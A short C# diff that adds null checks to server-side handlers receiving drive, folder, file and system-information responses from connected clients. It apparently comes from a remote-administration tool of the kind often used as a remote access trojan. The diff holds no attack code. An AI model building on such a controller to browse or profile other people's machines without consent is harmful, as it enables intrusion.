@@ -14,7 +14,7 @@ namespace xServer.Core.Commands
     {
         public static void HandleDrivesResponse(Client client, DrivesResponse packet)
         {
-            if (client.Value.FrmFm == null)
+            if (client.Value.FrmFm == null || packet.Drives == null)
                 return;
 
             client.Value.FrmFm.AddDrives(packet.Drives);
@@ -37,7 +37,7 @@ namespace xServer.Core.Commands
 
                 client.Value.FrmFm.AddItemToFileBrowser(lviBack);
 
-                if (packet.Folders.Length != 0)
+                if (packet.Folders != null && packet.Folders.Length != 0)
                 {
                     for (int i = 0; i < packet.Folders.Length; i++)
                     {
@@ -57,7 +57,7 @@ namespace xServer.Core.Commands
                     }
                 }
 
-                if (packet.Files.Length != 0)
+                if (packet.Files != null && packet.Files.Length != 0)
                 {
                     for (int i = 0; i < packet.Files.Length; i++)
                     {
@@ -84,6 +84,9 @@ namespace xServer.Core.Commands
 
         public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
         {
+            if (packet.SystemInfos == null)
+                return;
+
             if (XMLSettings.ShowToolTip)
             {
                 var builder = new StringBuilder();
